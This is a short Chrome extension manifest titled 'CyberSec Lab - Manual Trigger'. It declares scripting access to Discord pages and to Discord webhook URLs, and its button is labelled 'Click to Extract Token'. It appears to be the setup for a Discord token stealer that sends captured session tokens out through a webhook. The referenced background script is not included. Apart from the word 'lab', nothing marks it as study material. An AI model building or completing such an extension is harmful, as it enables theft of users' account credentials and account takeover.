{
  "manifest_version": 3,
  "name": "CyberSec Lab - Manual Trigger",
  "version": "6.0",
  "permissions": ["storage", "activeTab", "scripting"],
  "host_permissions": ["*://*.discord.com/*", "https://discord.com/api/webhooks/*"],
  "action": {
    "default_title": "Click to Extract Token"
  },
  "background": {
    "service_worker": "background.js"
  }
}
